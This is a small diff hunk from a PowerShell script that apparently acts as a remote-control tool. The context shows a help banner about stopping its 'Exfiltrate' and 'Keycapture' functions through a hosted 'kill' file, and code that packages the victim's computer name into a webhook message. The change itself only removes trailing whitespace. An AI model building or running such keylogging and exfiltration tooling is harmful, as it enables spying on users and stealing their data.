@@ -69,7 +69,7 @@ $msgsys = "``========================================================
 ========================================================
 = __To Exit Exiltrate or Keycapture__                  =
 = Edit your hosted file to contain 'kill'              =
-= this will exit the current function eg. 'keycapture' =  
+= this will exit the current function eg. 'keycapture' =
 ========================================================``"
 $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
